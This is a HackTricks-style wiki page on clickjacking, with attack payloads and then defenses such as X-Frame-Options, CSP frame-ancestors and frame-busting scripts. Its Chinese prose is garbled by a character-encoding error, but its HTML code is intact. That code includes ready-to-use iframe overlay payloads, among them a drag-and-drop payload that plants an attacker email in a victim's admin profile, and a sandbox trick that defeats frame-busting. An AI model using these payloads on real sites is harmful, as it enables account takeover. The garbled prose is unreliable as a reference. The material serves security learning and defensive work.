# ç‚¹å‡»åŠ«æŒ

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)å¯ä»¥è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œä½¿ç”¨ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## ä»€ä¹ˆæ˜¯ç‚¹å‡»åŠ«æŒ

åœ¨ç‚¹å‡»åŠ«æŒæ”»å‡»ä¸­ï¼Œ**ç”¨æˆ·**è¢«**æ¬ºéª—**ç‚¹å‡»ç½‘é¡µä¸Šçš„ä¸€ä¸ª**å…ƒç´ **ï¼Œè¯¥å…ƒç´ è¦ä¹ˆæ˜¯**ä¸å¯è§çš„**ï¼Œè¦ä¹ˆä¼ªè£…æˆå¦ä¸€ä¸ªå…ƒç´ ã€‚è¿™ç§æ“çºµå¯èƒ½ä¼šç»™ç”¨æˆ·å¸¦æ¥æ„å¤–åæœï¼Œå¦‚ä¸‹è½½æ¶æ„è½¯ä»¶ï¼Œé‡å®šå‘åˆ°æ¶æ„ç½‘é¡µï¼Œæä¾›å‡­æ®æˆ–æ•æ„Ÿä¿¡æ¯ï¼Œè½¬è´¦ï¼Œæˆ–åœ¨çº¿è´­ä¹°äº§å“ã€‚


### é¢„å¡«è¡¨å•æŠ€å·§

æœ‰æ—¶å¯ä»¥åœ¨åŠ è½½é¡µé¢æ—¶ä½¿ç”¨GETå‚æ•°**å¡«å……è¡¨å•å­—æ®µçš„å€¼**ã€‚æ”»å‡»è€…å¯èƒ½ä¼šæ»¥ç”¨è¿™ç§è¡Œä¸ºï¼Œå¡«å……ä¸€ä¸ªè¡¨å•çš„ä»»æ„æ•°æ®å¹¶å‘é€ç‚¹å‡»åŠ«æŒæœ‰æ•ˆè´Ÿè½½ï¼Œä»¥ä¾¿ç”¨æˆ·æŒ‰ä¸‹æäº¤æŒ‰é’®ã€‚

### ä½¿ç”¨æ‹–æ”¾å¡«å……è¡¨å•

å¦‚æœæ‚¨éœ€è¦ç”¨æˆ·**å¡«å†™è¡¨å•**ï¼Œä½†åˆä¸æƒ³ç›´æ¥è¦æ±‚ä»–è¾“å…¥æŸäº›ç‰¹å®šä¿¡æ¯ï¼ˆæ¯”å¦‚æ‚¨çŸ¥é“çš„ç”µå­é‚®ä»¶æˆ–ç‰¹å®šå¯†ç ï¼‰ï¼Œæ‚¨å¯ä»¥è¦æ±‚ä»–**æ‹–æ”¾**æŸäº›å†…å®¹ï¼Œè¿™äº›å†…å®¹å°†å†™å…¥æ‚¨æ§åˆ¶çš„æ•°æ®ï¼Œå°±åƒ[**è¿™ä¸ªç¤ºä¾‹**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/)ä¸­çš„æƒ…å†µã€‚

### åŸºæœ¬æœ‰æ•ˆè´Ÿè½½
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### å¤šæ­¥éª¤æœ‰æ•ˆè½½è·
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### æ‹–æ”¾ + ç‚¹å‡»æœ‰æ•ˆè½½è·
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

å¦‚æœæ‚¨å·²ç»ç¡®å®šäº†ä¸€ä¸ªéœ€è¦ç”¨æˆ·ç‚¹å‡»æŸä¸ªå…ƒç´ æ¥è§¦å‘ XSS æ”»å‡»çš„æƒ…å†µï¼Œå¹¶ä¸”é¡µé¢å®¹æ˜“å—åˆ°ç‚¹å‡»åŠ«æŒæ”»å‡»ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥æ¬ºéª—ç”¨æˆ·ç‚¹å‡»æŒ‰é’®/é“¾æ¥ã€‚\
ç¤ºä¾‹:\
_æ‚¨å‘ç°è´¦æˆ·ç§äººè¯¦ç»†ä¿¡æ¯ä¸­å­˜åœ¨è‡ªèº« XSSï¼ˆåªæœ‰æ‚¨å¯ä»¥è®¾ç½®å’Œè¯»å–çš„è¯¦ç»†ä¿¡æ¯ï¼‰ã€‚ç”¨äºè®¾ç½®è¿™äº›è¯¦ç»†ä¿¡æ¯çš„é¡µé¢å®¹æ˜“å—åˆ°ç‚¹å‡»åŠ«æŒæ”»å‡»ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ GET å‚æ•°é¢„å¡«å……è¡¨å•ã€‚_\
\_\_æ”»å‡»è€…å¯ä»¥å‡†å¤‡ä¸€ä¸ªç‚¹å‡»åŠ«æŒæ”»å‡»åˆ°è¯¥é¡µé¢ï¼Œä½¿ç”¨ XSS è´Ÿè½½é¢„å¡«å……è¡¨å•ï¼Œå¹¶æ¬ºéª—ç”¨æˆ·æäº¤è¡¨å•ã€‚å› æ­¤ï¼Œå½“è¡¨å•æäº¤ä¸”å€¼è¢«ä¿®æ”¹æ—¶ï¼Œç”¨æˆ·å°†æ‰§è¡Œ XSSã€‚

## å‡è½»ç‚¹å‡»åŠ«æŒçš„ç­–ç•¥

### å®¢æˆ·ç«¯é˜²å¾¡

åœ¨å®¢æˆ·ç«¯æ‰§è¡Œçš„è„šæœ¬å¯ä»¥æ‰§è¡Œæ“ä½œä»¥é˜²æ­¢ç‚¹å‡»åŠ«æŒï¼š

* ç¡®ä¿åº”ç”¨ç¨‹åºçª—å£æ˜¯ä¸»çª—å£æˆ–é¡¶å±‚çª—å£ã€‚
* ä½¿æ‰€æœ‰æ¡†æ¶å¯è§ã€‚
* é˜²æ­¢åœ¨ä¸å¯è§æ¡†æ¶ä¸Šç‚¹å‡»ã€‚
* æ£€æµ‹å¹¶è­¦å‘Šç”¨æˆ·å¯èƒ½çš„ç‚¹å‡»åŠ«æŒå°è¯•ã€‚

ç„¶è€Œï¼Œè¿™äº›ç ´åæ¡†æ¶çš„è„šæœ¬å¯èƒ½ä¼šè¢«è§„é¿ï¼š

* **æµè§ˆå™¨çš„å®‰å…¨è®¾ç½®ï¼š** ä¸€äº›æµè§ˆå™¨å¯èƒ½ä¼šæ ¹æ®å…¶å®‰å…¨è®¾ç½®æˆ–ç¼ºä¹ JavaScript æ”¯æŒæ¥é˜»æ­¢è¿™äº›è„šæœ¬ã€‚
* **HTML5 iframe `sandbox` å±æ€§ï¼š** æ”»å‡»è€…å¯ä»¥é€šè¿‡è®¾ç½® `sandbox` å±æ€§ä¸º `allow-forms` æˆ– `allow-scripts` è€Œä¸åŒ…æ‹¬ `allow-top-navigation` å€¼æ¥ä¸­å’Œç ´åæ¡†æ¶è„šæœ¬ã€‚è¿™ä¼šé˜»æ­¢ iframe éªŒè¯æ˜¯å¦ä¸ºé¡¶å±‚çª—å£ï¼Œä¾‹å¦‚ï¼Œ
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
### æœåŠ¡å™¨ç«¯é˜²å¾¡

#### X-Frame-Options

**`X-Frame-Options` HTTPå“åº”å¤´** é€šçŸ¥æµè§ˆå™¨æœ‰å…³åœ¨ `<frame>` æˆ– `<iframe>` ä¸­å‘ˆç°é¡µé¢çš„åˆæ³•æ€§ï¼Œæœ‰åŠ©äºé˜²æ­¢ç‚¹å‡»åŠ«æŒï¼š

- `X-Frame-Options: deny` - æ²¡æœ‰åŸŸå¯ä»¥å¯¹å†…å®¹è¿›è¡Œæ¡†æ¶åŒ–ã€‚
- `X-Frame-Options: sameorigin` - åªæœ‰å½“å‰ç«™ç‚¹å¯ä»¥å¯¹å†…å®¹è¿›è¡Œæ¡†æ¶åŒ–ã€‚
- `X-Frame-Options: allow-from https://trusted.com` - åªæœ‰æŒ‡å®šçš„ 'uri' å¯ä»¥å¯¹é¡µé¢è¿›è¡Œæ¡†æ¶åŒ–ã€‚
- è¯·æ³¨æ„é™åˆ¶ï¼šå¦‚æœæµè§ˆå™¨ä¸æ”¯æŒæ­¤æŒ‡ä»¤ï¼Œåˆ™å¯èƒ½æ— æ•ˆã€‚ä¸€äº›æµè§ˆå™¨æ›´å–œæ¬¢CSP frame-ancestorsæŒ‡ä»¤ã€‚

#### å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰frame-ancestorsæŒ‡ä»¤

**CSPä¸­çš„`frame-ancestors`æŒ‡ä»¤** æ˜¯é˜²æ­¢ç‚¹å‡»åŠ«æŒçš„å»ºè®®æ–¹æ³•ï¼š

- `frame-ancestors 'none'` - ç±»ä¼¼äº `X-Frame-Options: deny`ã€‚
- `frame-ancestors 'self'` - ç±»ä¼¼äº `X-Frame-Options: sameorigin`ã€‚
- `frame-ancestors trusted.com` - ç±»ä¼¼äº `X-Frame-Options: allow-from`ã€‚

ä¾‹å¦‚ï¼Œä»¥ä¸‹CSPä»…å…è®¸æ¥è‡ªç›¸åŒåŸŸçš„æ¡†æ¶åŒ–ï¼š

`Content-Security-Policy: frame-ancestors 'self';`

æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯å’Œå¤æ‚ç¤ºä¾‹ï¼Œè¯·å‚é˜…[frame-ancestors CSPæ–‡æ¡£](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors)å’Œ[Mozillaçš„CSP frame-ancestorsæ–‡æ¡£](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)ã€‚

### ä½¿ç”¨`child-src`å’Œ`frame-src`çš„å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰

**å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰** æ˜¯ä¸€é¡¹å®‰å…¨æªæ–½ï¼Œé€šè¿‡æŒ‡å®šæµè§ˆå™¨åº”å…è®¸åŠ è½½å†…å®¹çš„æ¥æºï¼Œæœ‰åŠ©äºé˜²æ­¢ç‚¹å‡»åŠ«æŒå’Œå…¶ä»–ä»£ç æ³¨å…¥æ”»å‡»ã€‚

#### `frame-src`æŒ‡ä»¤
- å®šä¹‰æ¡†æ¶çš„æœ‰æ•ˆæ¥æºã€‚
- æ¯”`default-src`æŒ‡ä»¤æ›´å…·ä½“ã€‚
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
è¿™ä¸ªç­–ç•¥å…è®¸æ¥è‡ªç›¸åŒæºï¼ˆselfï¼‰å’Œhttps://trusted-website.com çš„æ¡†æ¶ã€‚

#### `child-src` æŒ‡ä»¤
- åœ¨ CSP 2 çº§ä¸­å¼•å…¥ï¼Œç”¨äºè®¾ç½® Web Workers å’Œæ¡†æ¶çš„æœ‰æ•ˆæ¥æºã€‚
- ä½œä¸º frame-src å’Œ worker-src çš„åå¤‡ã€‚
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
è¿™ä¸ªç­–ç•¥å…è®¸æ¥è‡ªç›¸åŒæ¥æºï¼ˆselfï¼‰å’Œhttps://trusted-website.com çš„æ¡†æ¶å’Œå·¥ä½œè€…ã€‚

**ä½¿ç”¨æ³¨æ„äº‹é¡¹:**
- å¼ƒç”¨: child-src æ­£åœ¨é€æ­¥è¢« frame-src å’Œ worker-src å–ä»£ã€‚
- å›é€€è¡Œä¸º: å¦‚æœ frame-src ä¸å­˜åœ¨ï¼Œåˆ™ frames çš„å›é€€é€‰é¡¹æ˜¯ child-srcã€‚å¦‚æœä¸¤è€…éƒ½ä¸å­˜åœ¨ï¼Œåˆ™ä½¿ç”¨ default-srcã€‚
- ä¸¥æ ¼çš„æºå®šä¹‰: åœ¨æŒ‡ä»¤ä¸­åªåŒ…å«å¯ä¿¡ä»»çš„æ¥æºï¼Œä»¥é˜²æ­¢è¢«åˆ©ç”¨ã€‚

#### JavaScript æ‰“ç ´æ¡†æ¶çš„è„šæœ¬

å°½ç®¡ä¸æ˜¯å®Œå…¨å¯é ï¼ŒåŸºäº JavaScript çš„æ‰“ç ´æ¡†æ¶è„šæœ¬å¯ç”¨äºé˜²æ­¢ç½‘é¡µè¢«æ¡†æ¶åŒ–ã€‚ç¤ºä¾‹:
```javascript
if (top !== self) {
top.location = self.location;
}
```
#### ä½¿ç”¨åCSRFä»¤ç‰Œ

* **ä»¤ç‰ŒéªŒè¯:** åœ¨Webåº”ç”¨ç¨‹åºä¸­ä½¿ç”¨åCSRFä»¤ç‰Œï¼Œä»¥ç¡®ä¿çŠ¶æ€æ›´æ”¹è¯·æ±‚æ˜¯ç”±ç”¨æˆ·æœ‰æ„è¿›è¡Œçš„ï¼Œè€Œä¸æ˜¯é€šè¿‡Clickjackedé¡µé¢ã€‚

## å‚è€ƒèµ„æ–™

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) å¯è½»æ¾æ„å»ºå’Œ **è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œä½¿ç”¨ä¸–ç•Œä¸Š **æœ€å…ˆè¿›** çš„ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„ **å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å– [**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢ [**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* é€šè¿‡å‘ **HackTricks** å’Œ **HackTricks Cloud** çš„githubä»“åº“æäº¤PRæ¥ **åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
